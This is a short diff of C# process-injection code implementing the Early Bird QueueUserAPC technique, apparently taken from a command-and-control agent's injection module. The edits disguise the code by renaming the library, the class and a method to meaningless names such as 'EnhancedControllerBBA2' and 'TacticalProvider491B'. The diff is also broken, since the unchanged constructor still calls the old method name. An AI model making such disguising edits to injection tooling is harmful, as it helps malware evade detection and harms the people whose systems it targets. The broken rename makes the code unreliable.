@@ -1,13 +1,13 @@
 ﻿using System;
 using System.Diagnostics;
-using ApolloInterop.Classes.Api;
-using ApolloInterop.Classes.Core;
-using ApolloInterop.Interfaces;
+using PhantomInterop.Classes.Api;
+using PhantomInterop.Classes.Core;
+using PhantomInterop.Interfaces;
 using static Injection.Shared.Win32;
 
 namespace Injection.Techniques.EarlyBird
 {
-    public class QueueUserAPC : InjectionTechnique
+    public class EnhancedControllerBBA2 : InjectionTechnique
     {
         private enum ThreadAccessRights : UInt32
         {
@@ -66,7 +66,7 @@ namespace Injection.Techniques.EarlyBird
             GetFunctionPointers();
         }
 
-        private void GetFunctionPointers()
+        private void TacticalProvider491B()
         {
             _pOpenThread = _agent.GetApi().GetLibraryFunction<OpenThread>(Library.KERNEL32, "OpenThread");
             _pVirtualAllocEx = _agent.GetApi().GetLibraryFunction<VirtualAllocEx>(Library.KERNEL32, "VirtualAllocEx");
